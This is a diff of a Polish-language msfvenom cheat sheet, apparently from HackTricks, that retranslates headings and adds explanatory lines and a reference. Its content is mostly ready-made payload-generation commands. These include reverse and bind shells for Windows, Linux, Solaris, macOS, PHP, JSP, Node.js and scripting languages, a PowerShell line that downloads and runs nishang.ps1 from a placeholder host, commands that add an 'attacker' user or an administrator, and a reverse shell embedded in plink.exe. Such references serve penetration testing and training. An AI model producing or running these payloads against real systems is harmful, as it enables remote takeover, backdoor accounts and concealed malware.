@@ -1,21 +1,21 @@
 # MSFVenom - Ściągawka
 
-{{#include ../../banners/hacktricks-training.md}}
-
 ---
 
 ## Podstawy msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Można również użyć `-a`, aby określić architekturę, lub `--platform`
+Użyj `-a`, aby wybrać architekturę payloadu, oraz `--platform`, aby wybrać docelową platformę.<sup>[[1]](#references)</sup>
 
-## Listowanie
+## Lista
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## Typowe parametry podczas tworzenia shellcode'u
+Te polecenia wyświetlają moduły payloadów i encoderów dostępne w zainstalowanym frameworku.<sup>[[1]](#references)</sup>
+
+## Typowe parametry podczas tworzenia shellcode
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -23,6 +23,8 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
+Flagi pokazane tutaj wybierają niedozwolone znaki, format wyjściowy, encoder oraz liczbę iteracji encodingu.<sup>[[1]](#references)</sup>
+
 ## **Windows**
 
 ### **Reverse Shell**
@@ -41,7 +43,7 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-### **Wykonaj polecenie**
+### **Wykonywanie poleceń**
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
@@ -50,11 +52,11 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### Osadzony wewnątrz pliku wykonywalnego
+### Osadzone wewnątrz pliku wykonywalnego
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
-## Payloads dla Linuxa
+## Linux Payloads
 
 ### Reverse Shell
 ```bash
@@ -69,7 +71,7 @@ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) 
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
-## **MAC Payloads**
+## **Payloady MAC**
 
 ### **Reverse Shell:**
 ```bash
@@ -79,7 +81,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ma
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
-## **Payloady webowe**
+## **Payloady Web**
 
 ### **PHP**
 
@@ -111,7 +113,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Ładunki w językach skryptowych**
+## **Payloady w językach skryptowych**
 
 ### **Perl**
 ```bash
@@ -125,4 +127,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
+## References
+
+- [1] [Jak używać msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
 {{#include ../../banners/hacktricks-training.md}}
